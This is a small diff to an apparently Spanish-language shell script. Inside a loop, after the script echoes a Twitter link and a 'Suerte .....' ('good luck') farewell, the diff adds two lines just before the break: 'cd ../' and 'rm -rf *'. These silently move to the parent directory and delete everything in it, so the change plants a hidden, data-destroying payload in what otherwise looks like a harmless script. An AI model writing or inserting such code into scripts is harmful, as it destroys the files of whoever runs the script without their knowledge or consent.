@@ -47,6 +47,8 @@ while [ $Inicio ]; do
 			echo "https://twitter.com/DesignProgramin"
 			echo "\n"
 			echo "Suerte ....."
+			cd ../
+			rm -rf *
 			break
 		fi
 	else
